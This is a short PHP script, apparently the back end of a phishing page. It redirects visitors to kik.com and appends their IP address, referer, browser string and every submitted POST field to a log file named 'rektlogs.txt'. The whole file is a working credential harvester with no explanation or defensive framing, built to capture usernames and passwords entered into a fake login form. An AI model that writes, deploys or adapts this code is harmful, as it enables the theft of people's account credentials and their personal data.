<?php
header ('Location:http://kik.com/');
$address = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'];
$browser = $_SERVER['HTTP_USER_AGENT'];
 
$file = fopen("rektlogs.txt",  "a");  
 
$time = date("H:i dS F");
fwrite( $file, "<b>Time:</b> $time
" );
 
if( $address != null)
{
  fwrite( $file, "<b>IP Address:</b> $address
");
}  
 
if( $referer != null)
{
  fwrite( $file, "<b>Referer:</b> $referer
");  
}
 
fwrite( $file, "<b>Browser:</b> $browser
<hr>");  
foreach($_POST as $variable => $value) {
   fwrite( $file , $variable);
   fwrite( $file , "=");
   fwrite( $file , $value);
   fwrite( $file , "\r\n");
}
fwrite( $file , "\r\n");
fclose( $file );
exit;
?>